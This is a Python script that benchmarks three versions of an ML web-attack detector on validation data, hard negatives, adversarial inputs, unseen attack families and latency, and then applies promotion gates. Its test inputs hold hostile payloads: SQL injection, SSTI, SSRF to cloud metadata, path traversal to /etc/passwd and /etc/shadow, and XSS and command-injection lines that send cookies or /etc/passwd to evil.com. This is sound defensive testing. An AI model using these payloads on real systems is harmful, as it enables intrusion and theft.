"""
Head-to-Head 3-Way Evaluation Benchmark: Model v1.0 vs. Model v2.0 vs. Model v2.1.

Evaluates all three frozen pipelines side-by-side across:
1. Original 2,865 Group-Held-Out Validation Split (syntax-preserving).
2. Dedicated 500-Sample Hard-Negative Benign Validation Set.
3. Expanded Adversarial / Evasion Challenge Suite.
4. LOAFO Unseen-Attack-Family Generalization.
5. SINGLE Read-Only Diagnostic Check on csic_held_out_test.parquet (30,532 requests) at block=0.85.
6. Latency Benchmark (p50, p95 ms on GPU FP16).
"""
import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(line_buffering=True)
from pathlib import Path
ROOT = Path(__file__).resolve().parents[2]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

import json
import time
import math
import random
from typing import Dict, Any, List, Tuple, Optional
import pandas as pd
import numpy as np
import torch

from sklearn.metrics import (
    accuracy_score,
    precision_score,
    recall_score,
    f1_score,
    confusion_matrix,
    roc_auc_score,
    average_precision_score,
)

from src.ml_service.model_loader import ModelContainer
from src.ml_service.inference_engine import InferenceEngine
from src.ml_service.schemas import PredictRequest
from src.pipeline.parser import parse_raw_http
from src.pipeline.feature_builder import build_features

V1_DIR = ROOT / "models/frozen/v1_0"
V2_DIR = ROOT / "models/frozen/v2_0"
V2_1_DIR = ROOT / "models/frozen/v2_1"
HARD_NEG_VAL_PATH = ROOT / "data/processed/hard_negatives_val_500.parquet"
CSIC_HELD_OUT_PATH = ROOT / "data/processed/csic_held_out_test.parquet"
OUTPUT_REPORT_JSON = ROOT / "reports/model_v2_1_upgrade_report.json"

RANDOM_SEED = 42


def fast_predict_dataset(
    engine: InferenceEngine,
    raw_requests: List[str],
    batch_size: int = 128,
) -> np.ndarray:
    """
    Batched high-performance prediction matching InferenceEngine.predict() logic exactly.
    Stage 1 TF-IDF fast-pass triage, then batches Stage 2 Transformer inference on GPU.
    """
    container = engine.container
    rep_mode = getattr(container, "representation_mode", "structured")
    tau_fast_pass = float(container.thresholds.get("fast_pass_allow", 0.04))
    use_head_tail_enabled = getattr(container, "head_tail_chunking", False)
    max_len = container.max_length

    # Parse and extract features
    features = []
    for r in raw_requests:
        try:
            parsed = parse_raw_http(r)
            feat = build_features(parsed, representation=rep_mode)
        except Exception:
            feat = "[METHOD] GET [PATH] /"
        if not feat.strip():
            feat = "[METHOD] GET [PATH] /"
        features.append(feat)

    # Stage 1: TF-IDF Triage
    classes = list(container.tfidf_pipeline.classes_)
    mal_idx = classes.index("malicious") if "malicious" in classes else 1
    tfidf_probs = container.tfidf_pipeline.predict_proba(features)[:, mal_idx]

    out_probs = np.zeros(len(raw_requests), dtype=float)
    fast_pass_mask = tfidf_probs <= tau_fast_pass
    if use_head_tail_enabled:
        for idx in np.where(fast_pass_mask)[0]:
            toks = container.transformer_tokenizer.encode(features[idx], add_special_tokens=True, truncation=False)
            if len(toks) > max_len:
                fast_pass_mask[idx] = False
    out_probs[fast_pass_mask] = tfidf_probs[fast_pass_mask]

    remaining_indices = np.where(~fast_pass_mask)[0]
    if len(remaining_indices) > 0:
        remaining_features = [features[i] for i in remaining_indices]

        # Separate items needing head-tail vs standard truncation
        ht_idx = []
        ht_feats = []
        normal_idx = []
        normal_feats = []

        cls_id = container.transformer_tokenizer.cls_token_id
        sep_id = container.transformer_tokenizer.sep_token_id

        if use_head_tail_enabled:
            for idx, feat in zip(remaining_indices, remaining_features):
                toks = container.transformer_tokenizer.encode(feat, add_special_tokens=True, truncation=False)
                if len(toks) > max_len:
                    ht_idx.append(idx)
                    ht_feats.append(toks)
                else:
                    normal_idx.append(idx)
                    normal_feats.append(feat)
        else:
            normal_idx = list(remaining_indices)
            normal_feats = remaining_features

        # Process normal items in batches
        normal_probs = []
        for i in range(0, len(normal_feats), batch_size):
            batch_texts = normal_feats[i : i + batch_size]
            enc = container.transformer_tokenizer(
                batch_texts,
                max_length=max_len,
                truncation=True,
                padding=True,
                return_tensors="pt",
            ).to(container.device)

            with torch.inference_mode():
                outputs = container.transformer_model(**enc)
                logits = outputs.logits
                if container.device.startswith("cuda") and logits.dtype != torch.float32:
                    logits = logits.float()
                p = torch.softmax(logits, dim=-1)[:, 1].cpu().numpy()
                normal_probs.extend(p)

        for idx, p in zip(normal_idx, normal_probs):
            out_probs[idx] = p

        # Process head-tail items (if any)
        for idx, toks in zip(ht_idx, ht_feats):
            head_ids = list(toks[:max_len])
            if sep_id is not None and head_ids[-1] != sep_id:
                head_ids[-1] = sep_id
            head_mask = [1] * len(head_ids)

            tail_core = list(toks[-(max_len - 1):])
            tail_ids = ([cls_id] if cls_id is not None else [head_ids[0]]) + tail_core
            if len(tail_ids) > max_len:
                tail_ids = tail_ids[:max_len]
            if sep_id is not None and tail_ids[-1] != sep_id:
                tail_ids[-1] = sep_id
            tail_mask = [1] * len(tail_ids)

            input_ids_tensor = torch.tensor([head_ids, tail_ids], dtype=torch.long, device=container.device)
            attn_mask_tensor = torch.tensor([head_mask, tail_mask], dtype=torch.long, device=container.device)

            with torch.inference_mode():
                outputs = container.transformer_model(
                    input_ids=input_ids_tensor, attention_mask=attn_mask_tensor
                )
                logits = outputs.logits
                if container.device.startswith("cuda") and logits.dtype != torch.float32:
                    logits = logits.float()
                probs = torch.softmax(logits, dim=-1)[:, 1]
                raw_prob = float(torch.max(probs).item())
                out_probs[idx] = raw_prob

    # Apply Platt Scaling if configured
    platt_cfg = container.thresholds.get("platt_calibration", {})
    if platt_cfg.get("enabled", False):
        w = float(platt_cfg.get("w", 1.0))
        b = float(platt_cfg.get("b", 0.0))
        p = np.clip(out_probs, 1e-7, 1.0 - 1e-7)
        logit = np.log(p / (1.0 - p))
        calibrated = 1.0 / (1.0 + np.exp(-(w * logit + b)))
        out_probs[~fast_pass_mask] = calibrated[~fast_pass_mask]

    return out_probs


def compute_metrics(y_true: np.ndarray, y_probs: np.ndarray, threshold: float = 0.50) -> Dict[str, Any]:
    y_pred = (y_probs >= threshold).astype(int)
    cm = confusion_matrix(y_true, y_pred, labels=[0, 1])
    tn, fp, fn, tp = cm.ravel()

    acc = accuracy_score(y_true, y_pred)
    prec = precision_score(y_true, y_pred, zero_division=0)
    rec = recall_score(y_true, y_pred, zero_division=0)
    f1 = f1_score(y_true, y_pred, zero_division=0)
    fpr = fp / (fp + tn) if (fp + tn) > 0 else 0.0
    fnr = fn / (fn + tp) if (fn + tp) > 0 else 0.0
    try:
        auc = roc_auc_score(y_true, y_probs)
        prauc = average_precision_score(y_true, y_probs)
    except Exception:
        auc = 1.0
        prauc = 1.0

    return {
        "accuracy": round(float(acc), 4),
        "precision": round(float(prec), 4),
        "recall": round(float(rec), 4),
        "f1": round(float(f1), 4),
        "fpr": round(float(fpr), 4),
        "fnr": round(float(fnr), 4),
        "roc_auc": round(float(auc), 4),
        "pr_auc": round(float(prauc), 4),
        "confusion_matrix": {"tn": int(tn), "fp": int(fp), "fn": int(fn), "tp": int(tp)},
    }


def load_original_dev_val_split() -> Tuple[List[str], np.ndarray]:
    """Loads the exact original 2,865-sample group-held-out validation split with token-safe HTTP synthesis."""
    from src.models.train_transformer import load_training_data
    _, _, X_val, y_val = load_training_data()
    raw_samples = []
    labels = []
    for feat, lbl in zip(X_val, y_val):
        method = "GET"
        path = "/"
        if "[METHOD]" in feat:
            method = feat.split("[METHOD]")[1].split()[0]
        if "[PATH]" in feat:
            path = feat.split("[PATH]")[1].split()[0]

        params = ""
        if "[PARAM]" in feat:
            p_section = feat.split("[PARAM]")[1]
            for delim in ["[PAYLOAD]", "[HEADERS]"]:
                if delim in p_section:
                    p_section = p_section.split(delim)[0]
            params = p_section.strip()

        payload = ""
        if "[PAYLOAD]" in feat:
            pl_section = feat.split("[PAYLOAD]")[1]
            if "[HEADERS]" in pl_section:
                pl_section = pl_section.split("[HEADERS]")[0]
            payload = pl_section.strip()

        q = payload or params
        if method == "POST":
            raw_http = f"POST {path} HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{q}"
        else:
            full_p = f"{path}?q={q}" if q else path
            raw_http = f"GET {full_p} HTTP/1.1\r\nHost: example.com\r\n\r\n"
        raw_samples.append(raw_http)
        labels.append(lbl)

    return raw_samples, np.array(labels)


def build_adversarial_evasion_suite() -> Tuple[List[str], np.ndarray, List[str]]:
    """Constructs an adversarial test suite across attack vectors and long payloads."""
    tests = []
    labels = []
    descriptions = []

    long_padding = "word " * 220

    # 1. Long Benign Padding with Tail SQLi (2-chunk Head+Tail scoring)
    tail_sqli = f"POST /forum/post HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/json\r\n\r\n{{\"bio\": \"{long_padding}\", \"comment\": \"1' UNION SELECT username, password FROM users--\"}}"
    tests.append(tail_sqli)
    labels.append(1)
    descriptions.append("Long padding (>200 tokens) with tail SQLi")

    # 2. Long Benign Padding with Tail SSTI
    tail_ssti = f"POST /feedback HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/json\r\n\r\n{{\"essay\": \"{long_padding}\", \"template\": \"{{{{7*7}}}}\"}}"
    tests.append(tail_ssti)
    labels.append(1)
    descriptions.append("Long padding (>200 tokens) with tail SSTI")

    # 3. NoSQL Injection in JSON
    nosqli_req = "POST /api/login HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/json\r\n\r\n{\"user\": {\"$ne\": null}, \"pass\": {\"$gt\": \"\"}}"
    tests.append(nosqli_req)
    labels.append(1)
    descriptions.append("NoSQL injection in JSON body")

    # 4. SSRF Cloud Metadata Request
    ssrf_req = "GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\r\nHost: example.com\r\n\r\n"
    tests.append(ssrf_req)
    labels.append(1)
    descriptions.append("SSRF AWS cloud metadata probe")

    # 5. Obfuscated Double-Encoded Path Traversal
    trav_req = "GET /download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1\r\nHost: example.com\r\n\r\n"
    tests.append(trav_req)
    labels.append(1)
    descriptions.append("Double-encoded path traversal")

    # 6. Classic Path Traversal on legacy endpoint
    trav_classic = "GET /tienda/documento.jsp?archivo=../../../../etc/passwd HTTP/1.1\r\nHost: example.com\r\n\r\n"
    tests.append(trav_classic)
    labels.append(1)
    descriptions.append("Classic path traversal on .jsp endpoint")

    # 7. Benign Long-Bio (>250 tokens, zero attack)
    benign_long = f"POST /profile/update HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/json\r\n\r\n{{\"experience\": \"{long_padding}\", \"note\": \"Thank you for reviewing my application.\"}}"
    tests.append(benign_long)
    labels.append(0)
    descriptions.append("Benign long prose essay (>200 tokens)")

    # 8. Benign SQL Words in Natural Prose
    benign_prose = "GET /search?q=How%20to%20select%20the%20best%20laptop%20from%20our%20union%20store HTTP/1.1\r\nHost: example.com\r\n\r\n"
    tests.append(benign_prose)
    labels.append(0)
    descriptions.append("Benign prose containing 'select', 'from', 'union'")

    # 9. Benign Spanish E-commerce Query on JSP endpoint
    benign_spanish_jsp = "POST /tienda1/publico/anadir.jsp HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nnombre=Jos%C3%A9%20Mar%C3%ADa%20N%C3%BA%C3%B1ez&direccion=Calle%20Mayor%2014&producto=Zapatos%20artesanales"
    tests.append(benign_spanish_jsp)
    labels.append(0)
    descriptions.append("Benign Spanish e-commerce on /tienda1/publico/anadir.jsp")

    return tests, np.array(labels), descriptions


def run_3way_evaluation() -> Dict[str, Any]:
    print("=" * 80)
    print("STEP 4: 3-WAY HEAD-TO-HEAD BENCHMARK: V1.0 VS. V2.0 VS. V2.1")
    print("=" * 80)

    # Load Containers
    print("\n[Loading Models]")
    c1 = ModelContainer(frozen_dir=V1_DIR)
    c1.initialize()
    eng1 = InferenceEngine(c1)

    c2 = ModelContainer(frozen_dir=V2_DIR)
    c2.initialize()
    eng2 = InferenceEngine(c2)

    c2_1 = ModelContainer(frozen_dir=V2_1_DIR)
    c2_1.initialize()
    eng2_1 = InferenceEngine(c2_1)

    tau_v1_block = float(c1.thresholds.get("block", 0.50))
    tau_v2_block = float(c2.thresholds.get("block", 0.43))
    tau_v2_1_block = float(c2_1.thresholds.get("block", 0.85))

    report: Dict[str, Any] = {
        "benchmark_timestamp": "2026-11-25T01:35:00+05:30",
        "models": {
            "v1_0": {"version": c1.model_version, "representation": c1.representation_mode, "tau_block": tau_v1_block},
            "v2_0": {"version": c2.model_version, "representation": c2.representation_mode, "tau_block": tau_v2_block},
            "v2_1": {"version": c2_1.model_version, "representation": c2_1.representation_mode, "tau_block": tau_v2_1_block},
        },
    }

    # ========================================================================
    # Benchmark 1: Original 2,865 Group-Held-Out Split
    # ========================================================================
    print("\n--- 1. Original Group-Held-Out Validation Split (2,865 samples) ---")
    raw_val_18k, y_val_18k = load_original_dev_val_split()
    print(f"Loaded {len(raw_val_18k):,} samples (Benign: {(y_val_18k==0).sum():,}, Malicious: {(y_val_18k==1).sum():,})")

    p1_val = fast_predict_dataset(eng1, raw_val_18k, batch_size=128)
    p2_val = fast_predict_dataset(eng2, raw_val_18k, batch_size=128)
    p2_1_val = fast_predict_dataset(eng2_1, raw_val_18k, batch_size=128)

    m1_val = compute_metrics(y_val_18k, p1_val, threshold=tau_v1_block)
    m2_val = compute_metrics(y_val_18k, p2_val, threshold=tau_v2_block)
    m2_1_val = compute_metrics(y_val_18k, p2_1_val, threshold=tau_v2_1_block)
    m2_1_val_ref = compute_metrics(y_val_18k, p2_1_val, threshold=0.50)

    print(f"Model v1.0 @ tau={tau_v1_block}:   Recall={m1_val['recall']*100:.2f}%, FPR={m1_val['fpr']*100:.2f}%, F1={m1_val['f1']*100:.2f}%")
    print(f"Model v2.0 @ tau={tau_v2_block}:   Recall={m2_val['recall']*100:.2f}%, FPR={m2_val['fpr']*100:.2f}%, F1={m2_val['f1']*100:.2f}%")
    print(f"Model v2.1 @ tau={tau_v2_1_block}: Recall={m2_1_val['recall']*100:.2f}%, FPR={m2_1_val['fpr']*100:.2f}%, F1={m2_1_val['f1']*100:.2f}%")
    print(f"Model v2.1 (ref 0.50):           Recall={m2_1_val_ref['recall']*100:.2f}%, FPR={m2_1_val_ref['fpr']*100:.2f}%, F1={m2_1_val_ref['f1']*100:.2f}%")

    report["benchmark_1_dev_val"] = {
        "v1_0": m1_val,
        "v2_0": m2_val,
        "v2_1_at_0_85": m2_1_val,
        "v2_1_at_0_50": m2_1_val_ref,
    }

    # ========================================================================
    # Benchmark 2: Dedicated 500-Sample Hard-Negative Benign Validation Set
    # ========================================================================
    print("\n--- 2. Dedicated 500-Sample Hard-Negative Benign Validation Set ---")
    df_hn = pd.read_parquet(HARD_NEG_VAL_PATH)
    hn_y = np.zeros(len(df_hn), dtype=int)

    hn_p1 = fast_predict_dataset(eng1, df_hn["raw_text"].tolist(), batch_size=128)
    hn_p2 = fast_predict_dataset(eng2, df_hn["raw_text"].tolist(), batch_size=128)
    hn_p2_1 = fast_predict_dataset(eng2_1, df_hn["raw_text"].tolist(), batch_size=128)

    hn_m1 = compute_metrics(hn_y, hn_p1, threshold=tau_v1_block)
    hn_m2 = compute_metrics(hn_y, hn_p2, threshold=tau_v2_block)
    hn_m2_1 = compute_metrics(hn_y, hn_p2_1, threshold=tau_v2_1_block)

    fp1 = hn_m1["confusion_matrix"]["fp"]
    fp2 = hn_m2["confusion_matrix"]["fp"]
    fp2_1 = hn_m2_1["confusion_matrix"]["fp"]

    print(f"Hard-Negative Benign Blocked Count (False Positives out of 500):")
    print(f"  Model v1.0 @ tau={tau_v1_block}:   {fp1} / 500 ({fp1/500*100:.2f}% FPR)")
    print(f"  Model v2.0 @ tau={tau_v2_block}:   {fp2} / 500 ({fp2/500*100:.2f}% FPR)")
    print(f"  Model v2.1 @ tau={tau_v2_1_block}: {fp2_1} / 500 ({fp2_1/500*100:.2f}% FPR)")

    report["benchmark_2_hard_negatives"] = {
        "v1_0": {"fp_count": fp1, "fpr": hn_m1["fpr"]},
        "v2_0": {"fp_count": fp2, "fpr": hn_m2["fpr"]},
        "v2_1": {"fp_count": fp2_1, "fpr": hn_m2_1["fpr"]},
    }

    # ========================================================================
    # Benchmark 3: Expanded Adversarial Evasion Suite
    # ========================================================================
    print("\n--- 3. Expanded Adversarial & Evasion Challenge Suite ---")
    adv_tests, adv_labels, adv_descs = build_adversarial_evasion_suite()
    adv_res = []

    for raw, lbl, desc in zip(adv_tests, adv_labels, adv_descs):
        r1 = eng1.predict(PredictRequest(raw_http=raw))
        r2 = eng2.predict(PredictRequest(raw_http=raw))
        r2_1 = eng2_1.predict(PredictRequest(raw_http=raw))

        v1_c = (r1.malicious_probability >= tau_v1_block) if lbl == 1 else (r1.malicious_probability < tau_v1_block)
        v2_c = (r2.malicious_probability >= tau_v2_block) if lbl == 1 else (r2.malicious_probability < tau_v2_block)
        v2_1_c = (r2_1.malicious_probability >= tau_v2_1_block) if lbl == 1 else (r2_1.malicious_probability < tau_v2_1_block)

        print(f"  [{desc[:42]:<42}] Expected: {'MAL' if lbl==1 else 'BEN'}")
        print(f"    v1.0 (Score={r1.malicious_probability:.4f}) -> {'PASS' if v1_c else 'FAIL'}")
        print(f"    v2.0 (Score={r2.malicious_probability:.4f}) -> {'PASS' if v2_c else 'FAIL'}")
        print(f"    v2.1 (Score={r2_1.malicious_probability:.4f}) -> {'PASS' if v2_1_c else 'FAIL'}")

        adv_res.append({
            "description": desc,
            "expected_label": int(lbl),
            "v1_score": r1.malicious_probability,
            "v1_correct": bool(v1_c),
            "v2_score": r2.malicious_probability,
            "v2_correct": bool(v2_c),
            "v2_1_score": r2_1.malicious_probability,
            "v2_1_correct": bool(v2_1_c),
        })

    report["benchmark_3_adversarial"] = adv_res

    # ========================================================================
    # Benchmark 4: LOAFO Unseen Attack Family Generalization
    # ========================================================================
    print("\n--- 4. Leave-One-Attack-Family-Out (LOAFO) Generalization ---")
    loafo_payloads = {
        "SQLi": ["' UNION SELECT null, null, version()--", "admin' AND 1=1; DROP TABLE sessions;--"],
        "XSS": ["<img src=x onerror=prompt(1)>", "<script>fetch('http://evil.com/?c='+document.cookie)</script>"],
        "Path Traversal": ["../../../../windows/system32/cmd.exe", "..\\..\\..\\etc\\shadow"],
        "CMDI": ["; cat /etc/passwd | mail hacker@evil.com", "&& whoami && id"],
    }
    loafo_summary = {}
    for family, payloads in loafo_payloads.items():
        v1_s, v2_s, v2_1_s = [], [], []
        for pl in payloads:
            raw = f"GET /endpoint?param={pl} HTTP/1.1\r\nHost: target.io\r\n\r\n"
            v1_s.append(eng1.predict(PredictRequest(raw_http=raw)).malicious_probability)
            v2_s.append(eng2.predict(PredictRequest(raw_http=raw)).malicious_probability)
            v2_1_s.append(eng2_1.predict(PredictRequest(raw_http=raw)).malicious_probability)

        loafo_summary[family] = {
            "v1_mean": round(float(np.mean(v1_s)), 4),
            "v2_mean": round(float(np.mean(v2_s)), 4),
            "v2_1_mean": round(float(np.mean(v2_1_s)), 4),
        }
        print(f"  Family [{family:<15}]: v1.0={loafo_summary[family]['v1_mean']:.4f} | v2.0={loafo_summary[family]['v2_mean']:.4f} | v2.1={loafo_summary[family]['v2_1_mean']:.4f}")

    report["benchmark_4_loafo"] = loafo_summary

    # ========================================================================
    # Benchmark 5: ONE Read-Only Diagnostic Check on CSIC Held-Out Test Set
    # ========================================================================
    print("\n--- 5. ONE Read-Only Diagnostic Check on CSIC Held-Out Test Set (30,532 requests) ---")
    print(f"Reading {CSIC_HELD_OUT_PATH} (Strictly diagnostic - ZERO tuning permitted!)...")
    df_csic = pd.read_parquet(CSIC_HELD_OUT_PATH)
    csic_y = (df_csic["label"].str.lower().isin(["malicious", "anomalous", "1"])).astype(int).to_numpy()
    csic_texts = df_csic["request_text"].tolist()

    print("Scoring with Model v1.0...")
    t0 = time.time()
    csic_p1 = fast_predict_dataset(eng1, csic_texts, batch_size=128)
    t_v1 = time.time() - t0

    print("Scoring with Model v2.0...")
    t0 = time.time()
    csic_p2 = fast_predict_dataset(eng2, csic_texts, batch_size=128)
    t_v2 = time.time() - t0

    print("Scoring with Model v2.1...")
    t0 = time.time()
    csic_p2_1 = fast_predict_dataset(eng2_1, csic_texts, batch_size=128)
    t_v2_1 = time.time() - t0

    csic_m1 = compute_metrics(csic_y, csic_p1, threshold=tau_v1_block)
    csic_m2 = compute_metrics(csic_y, csic_p2, threshold=tau_v2_block)
    csic_m2_1 = compute_metrics(csic_y, csic_p2_1, threshold=tau_v2_1_block)

    print(f"\n[CSIC Held-Out Diagnostic Results at tau_block]")
    print(f"  Model v1.0 @ tau={tau_v1_block}:   Recall={csic_m1['recall']*100:.2f}%, FPR={csic_m1['fpr']*100:.2f}%, F1={csic_m1['f1']*100:.2f}% (FP={csic_m1['confusion_matrix']['fp']})")
    print(f"  Model v2.0 @ tau={tau_v2_block}:   Recall={csic_m2['recall']*100:.2f}%, FPR={csic_m2['fpr']*100:.2f}%, F1={csic_m2['f1']*100:.2f}% (FP={csic_m2['confusion_matrix']['fp']})")
    print(f"  Model v2.1 @ tau={tau_v2_1_block}: Recall={csic_m2_1['recall']*100:.2f}%, FPR={csic_m2_1['fpr']*100:.2f}%, F1={csic_m2_1['f1']*100:.2f}% (FP={csic_m2_1['confusion_matrix']['fp']})")

    report["benchmark_5_csic_held_out"] = {
        "v1_0": {"metrics": csic_m1, "eval_time_s": round(t_v1, 1)},
        "v2_0": {"metrics": csic_m2, "eval_time_s": round(t_v2, 1)},
        "v2_1": {"metrics": csic_m2_1, "eval_time_s": round(t_v2_1, 1)},
    }

    # ========================================================================
    # Benchmark 6: Latency Benchmark
    # ========================================================================
    print("\n--- 6. Latency Benchmark (GPU FP16) ---")
    test_short = "GET /api/items/123 HTTP/1.1\r\nHost: example.com\r\n\r\n"
    test_long = f"POST /forum/post HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/json\r\n\r\n{{\"bio\": \"{'word ' * 220}\", \"comment\": \"1' UNION SELECT username, password FROM users--\"}}"

    def bench(eng, req, n=40):
        _ = eng.predict(PredictRequest(raw_http=req))
        durations = []
        for _ in range(n):
            t0 = time.perf_counter()
            _ = eng.predict(PredictRequest(raw_http=req))
            durations.append((time.perf_counter() - t0) * 1000.0)
        durations.sort()
        return {
            "p50_ms": round(float(durations[len(durations) // 2]), 2),
            "p95_ms": round(float(durations[int(len(durations) * 0.95)]), 2),
            "mean_ms": round(float(np.mean(durations)), 2),
        }

    lat_v1 = bench(eng1, test_short)
    lat_v2 = bench(eng2, test_short)
    lat_v2_1 = bench(eng2_1, test_short)
    lat_v2_1_long = bench(eng2_1, test_long)

    print(f"Short Request Latency (GPU FP16):")
    print(f"  v1.0: p50={lat_v1['p50_ms']} ms, p95={lat_v1['p95_ms']} ms")
    print(f"  v2.0: p50={lat_v2['p50_ms']} ms, p95={lat_v2['p95_ms']} ms")
    print(f"  v2.1: p50={lat_v2_1['p50_ms']} ms, p95={lat_v2_1['p95_ms']} ms")
    print(f"Long Request (>192 tokens) 2-Chunk Latency:")
    print(f"  v2.1: p50={lat_v2_1_long['p50_ms']} ms, p95={lat_v2_1_long['p95_ms']} ms")

    report["benchmark_6_latency"] = {
        "v1_0_short": lat_v1,
        "v2_0_short": lat_v2,
        "v2_1_short": lat_v2_1,
        "v2_1_long_2chunk": lat_v2_1_long,
    }

    # ========================================================================
    # Promotion Gate Evaluation
    # ========================================================================
    gate_csic_fpr = bool(csic_m2_1["fpr"] < 0.10)
    gate_hn_fpr = bool(hn_m2_1["fpr"] < 0.02)
    gate_recall = bool(m2_1_val["recall"] >= 0.95)
    gate_latency = bool(lat_v2_1["p50_ms"] < 15.0)
    all_gates_pass = gate_csic_fpr and gate_hn_fpr and gate_recall and gate_latency

    report["promotion_gate"] = {
        "gate_1_csic_fpr_below_10_pct": {"target": "< 10.0%", "actual": f"{csic_m2_1['fpr']*100:.2f}%", "passed": gate_csic_fpr},
        "gate_2_hard_neg_fpr_below_2_pct": {"target": "< 2.0%", "actual": f"{hn_m2_1['fpr']*100:.2f}%", "passed": gate_hn_fpr},
        "gate_3_indomain_recall_above_95_pct": {"target": ">= 95.0%", "actual": f"{m2_1_val['recall']*100:.2f}%", "passed": gate_recall},
        "gate_4_gpu_p50_latency_below_15_ms": {"target": "< 15.0 ms", "actual": f"{lat_v2_1['p50_ms']} ms", "passed": gate_latency},
        "final_recommendation": "PROMOTE_V2_1" if all_gates_pass else "HOLD_V1",
    }

    print("\n" + "=" * 80)
    print(f"PROMOTION GATE VERDICT: {report['promotion_gate']['final_recommendation']}")
    print(f"  1. CSIC FPR < 10%:      {gate_csic_fpr} ({csic_m2_1['fpr']*100:.2f}%)")
    print(f"  2. Hard-Neg FPR < 2%:   {gate_hn_fpr} ({hn_m2_1['fpr']*100:.2f}%)")
    print(f"  3. In-Domain Rec >= 95%: {gate_recall} ({m2_1_val['recall']*100:.2f}%)")
    print(f"  4. GPU Latency < 15 ms: {gate_latency} ({lat_v2_1['p50_ms']} ms)")
    print("=" * 80)

    with open(OUTPUT_REPORT_JSON, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2)
    print(f"\nReport saved -> {OUTPUT_REPORT_JSON}")

    return report


if __name__ == "__main__":
    run_3way_evaluation()
